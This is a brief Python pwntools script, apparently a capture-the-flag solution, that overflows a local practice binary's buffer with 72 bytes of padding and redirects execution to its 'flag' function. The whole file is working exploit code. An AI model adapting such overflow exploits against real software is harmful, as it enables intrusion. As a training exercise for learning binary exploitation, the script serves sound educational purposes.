#!/usr/bin/env python

from pwn import *

p = process('./vuln')
e = ELF('./vuln')


flag = e.symbols['flag']
main = e.symbols['main']

print hex(flag)

#offset
offset = 72

#payload
payload = ''
payload = 'A'*offset
payload+= p64(main)
payload+= p64(flag)

#just gonna send it
p.sendlineafter('\n', payload)

#flag?
p.interactive()